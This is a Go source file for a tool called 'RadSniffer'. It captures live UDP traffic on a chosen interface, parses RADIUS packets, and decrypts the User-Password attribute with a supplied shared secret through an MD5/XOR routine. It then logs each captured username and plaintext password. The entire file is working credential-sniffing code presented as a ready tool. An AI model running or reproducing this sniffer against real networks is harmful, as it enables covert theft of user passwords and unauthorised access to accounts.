package main

import (
	"bytes"
	"crypto/md5"
	"errors"
	"fmt"
	"github.com/akamensky/argparse"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"
)

var (
	err       error
	handle    *pcap.Handle
	secret    *string
	ifaceAddr *string
)

func main() {
	parser := argparse.NewParser("RadSniffer", "Sniff and Captures the RADIUS Credentials")
	secret = parser.String("s", "secret", &argparse.Options{Required: true, Help: "Secret to decrypt passwords"})
	ifaceAddr = parser.String("i", "ip", &argparse.Options{Required: true, Help: "Interface to listen on"})
	err = parser.Parse(os.Args)
	if err != nil {
		log.Fatal(parser.Usage(err))
	}
	ifaceName := "ethernet"
	devices, devErr := pcap.FindAllDevs()
	if devErr != nil {
		log.Fatal(devErr)
	}
	found := false
	for _, device := range devices {
		for _, address := range device.Addresses {
			if address.IP.String() == *ifaceAddr {
				ifaceName = device.Name
				found = true
				break
			}
		}
	}
	if !found {
		log.Fatal("Unable to find the network interface")
	}
	handle, err = pcap.OpenLive(ifaceName, 65535, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()
	err := handle.SetBPFFilter("udp")
	if err != nil {
		log.Fatal(err)
	}

	go func() {
		for {
			data, _, err := handle.ReadPacketData()
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error reading packet data: %v\n", err)
			}
			go handlePacket(data)
		}
	}()

	//catch the signal
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	<-c
}
func handlePacket(data []byte) {
	var eth layers.Ethernet
	var ip4 layers.IPv4
	var ip6 layers.IPv6
	var udp layers.UDP
	var radius layers.RADIUS
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &ip6, &udp, &radius)
	decodedLayers := make([]gopacket.LayerType, 0, 5)
	err = parser.DecodeLayers(data, &decodedLayers)
	for _, typ := range decodedLayers {
		switch typ {
		case layers.LayerTypeRADIUS:
			username := ""
			password := ""
			for _, attr := range radius.Attributes {
				switch attr.Type {
				case layers.RADIUSAttributeTypeUserName:
					username = string(attr.Value)
				case layers.RADIUSAttributeTypeUserPassword:
					passwordTmp, err := UserPassword(attr.Value, []byte(*secret), radius.Authenticator)
					if err == nil {
						password = string(passwordTmp)
					}
				}
			}
			emitRadiusEvent(username, password)
		}
	}
}

func emitRadiusEvent(username string, password string) {
	log.Printf("Username: %s, Passsword: %s\n", username, password)
}

// UserPassword Borrowed from Layeh/goradius
func UserPassword(encryptedPassword []byte, secret []byte, requestAuthenticator layers.RADIUSAuthenticator) ([]byte, error) {
	if len(encryptedPassword) < 16 || len(encryptedPassword) > 128 {
		return nil, errors.New("invalid encryptedPassword length (" + strconv.Itoa(len(encryptedPassword)) + ")")
	}
	if len(secret) == 0 {
		return nil, errors.New("empty secret")
	}
	if len(requestAuthenticator) != 16 {
		return nil, errors.New("invalid requestAuthenticator length (" + strconv.Itoa(len(requestAuthenticator)) + ")")
	}

	dec := make([]byte, 0, len(encryptedPassword))

	hash := md5.New()
	hash.Write(secret)
	hash.Write(requestAuthenticator[:])
	dec = hash.Sum(dec)

	for i, b := range encryptedPassword[:16] {
		dec[i] ^= b
	}

	for i := 16; i < len(encryptedPassword); i += 16 {
		hash.Reset()
		hash.Write(secret)
		hash.Write(encryptedPassword[i-16 : i])
		dec = hash.Sum(dec)

		for j, b := range encryptedPassword[i : i+16] {
			dec[i+j] ^= b
		}
	}

	if i := bytes.IndexByte(dec, 0); i > -1 {
		return dec[:i], nil
	}
	return dec, nil
}
